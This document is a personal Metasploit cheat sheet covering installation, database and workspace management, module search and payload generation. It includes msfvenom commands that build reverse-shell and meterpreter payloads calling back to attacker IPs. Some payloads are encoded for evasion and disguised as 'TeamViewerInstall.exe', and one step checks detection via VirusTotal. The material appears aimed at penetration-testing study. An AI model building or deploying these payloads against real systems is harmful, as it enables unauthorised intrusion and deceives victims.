#metasploit
The `MSF engagement` structure can be divided into five main categories.
- Enumeration
- Preparation
- Exploitation
- Privilege Escalation
- Post-Exploitation
# Metasploit Installation
_with apt_
```bash
sudo apt update && sudo apt install metasploit-framework
```

## Program Path
```bash
ls /usr/share/metasploit-framework/modules    # modules
ls /usr/share/metasploit-framework/plugins/   # plugin
ls /usr/share/metasploit-framework/scripts/   # scripts
ls /usr/share/metasploit-framework/tools/     # tools
```

_Modules_
```bash
<No.> <type>/<os>/<service>/<name>            # path structure
794   exploit/windows/ftp/scriptftp_list      # example
```

## Manage DB
_Manage services_
```bash
sudo service postgresql status                # inspect services
sudo systemctl start postgresql               # start services
sudo msfdb init                               # init db
sudo msfdb status                             # inspect db services
```

_Connect to DB_
```bash
sudo msfdb run                                # connect to db
```

_Reinitiate the Database_
```bash
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q

msf6 > db_status
```
# Basic Usage
_launch `msfconsole`_
```bash
msfconsole
msfconsole -q    # no banner
```

_Search modules_

|**Type**|**Description**|
|---|---|
|`Auxiliary`|Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.|
|`Encoders`|Ensure that payloads are intact to their destination.|
|`Exploits`|Defined as modules that exploit a vulnerability that will allow for the payload delivery.|
|`NOPs`|(No Operation code) Keep the payload sizes consistent across exploit attempts.|
|`Payloads`|Code runs remotely and calls back to the attacker machine to establish a connection (or shell).|
|`Plugins`|Additional scripts can be integrated within an assessment with `msfconsole` and coexist.|
|`Post`|Wide array of modules to gather information, pivot deeper, etc.|
```bash
help search                               # all search options
search eternalromance                     # example for simple exploit search
search eternalromance type:exploit        # specify type
search type:exploit platform:windows cve:2021 rank:excellent microsoft # Acurance
```

# Payloads
We have three type of payloads
- Singles
- Stages
- Stager

##### msfvenom
_List Payloads_
```bash
msfvenom -l payloads
```

> [!NOTE] Staged vs Stageless
> A _steged payload_ is a payload that is sent to the target machine in multiple rounds, in contrast a _stageless payload_ is a single payload that is sent to the taget in a single round, this helps in scenarios of limited bandwidth or social engeniring techniques

_Example stageless payload for linux_
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > <name>.elf
```

_Example stageless payload for windows_
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > <name>.exe
```
# Workflow
_Select modules_
```bash
search <Key Words>        # search for keywords
use <NO.>                 # use index
option                    # display module options
info                      # display module info
```

_Customize Module_
```bash
set RHOSTS <IP>           # set target
setg RHOSTS <IP>          # set target permanently
show targets              # show target available for a module
set target <NO.>          # set target by index
set payload <NO.>         # set payload
show encoders             # search encoders
```

_Encode and Payloads_
we can use `msfpayload` and `msfencode`
```bash
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

After 2015 its are merge in `msfvenom`
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```

_Generation with encoding_
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```

_Test Payloads with VirusTotal_
```bash
msf-virustotal -k <API key> -f <FILE>
```

_Run_
```bash
run
exploit
```

## Add Work Space at Workflow 
For use it check if the database is healthy.
```bash
msf6 > workspace                # list workspaces
msf6 > workspace -a <NAME>      # add workspace
msf6 > workspace -d <NAME>      # delete workspace
msf6 > workspace <NAME>         # set workspace
msf6 > workspace -h             # view help
```

### Add scan to workspace
for do that we need a scan with nmap .xml
```bash
msf6 > db_import Target.xml        # import scan
msf6 > hosts                       # show host scan
msf6 > services                    # show services
msf6 > db_nmap <nmap flags> <IP>   # unse nmap inside msfconsole
```

_Backup Workspace_
```bash
msf6 > db_export -h                # view help
msf6 > db_export -f xml backup.xml # example exporting
```

_Hosts an Services_
With this features we can use information in workspace in other tools (msfconsole plugin es. nessus) 
```bash
hosts -h
services -h
```

_Creds and Loots_
Other two important storage point 
```bash
creds -h
loot -h
```



